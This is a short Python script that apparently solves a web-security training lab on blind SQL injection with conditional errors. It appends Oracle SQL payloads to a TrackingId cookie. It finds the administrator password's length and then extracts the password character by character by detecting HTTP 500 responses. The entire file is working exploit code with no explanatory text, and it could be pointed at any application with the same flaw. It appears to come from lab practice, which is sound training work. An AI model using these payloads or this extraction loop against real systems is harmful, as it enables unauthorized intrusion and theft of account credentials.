                #  FINDING THE LENGTH OF THE PASSWORD BY ITERNATING FROM 1 TO 101
                #  Change the session and tracking id by yours otherwise it will not run
import requests


url='https://0aac004504cef1a280ff082900e500c5.web-security-academy.net/filter?category=Lifestyle'
def get_length():
    for i in range(1,101):
        cookie={'TrackingId':'jCHPASU13DZUjeCD','session':'ve9YHUNUS7sKkboWNAL1ruVQTfyJDckd'}
        payload=f"' || (SELECT CASE WHEN (LENGTH((SELECT password FROM users WHERE username='administrator'))={i}) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||'"
        cookie['TrackingId']=cookie['TrackingId'] + payload
        r=requests.get(url,cookies=cookie)
        if r.status_code==500:
            return i
        
# len=get_length()
# print(f"Password length is {len}")
    

                        # FINDING THE PASSWORD 
characters='abcdefghijklmnopqrstuvwxyz0123456789'
def get_pass():
    str=''
    for i in range(1,21):
        for char in characters:
            cookie={'TrackingId':'jCHPASU13DZUjeCD','session':'ve9YHUNUS7sKkboWNAL1ruVQTfyJDckd'}
            payload=f"' || (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='administrator'),{i},1)='{char}') THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||' "
            cookie['TrackingId']=cookie['TrackingId'] + payload
            r=requests.get(url,cookies=cookie)
            if r.status_code == 500:
                print(char)
                str+=char
                break
    return str
call=get_pass()
print(call)
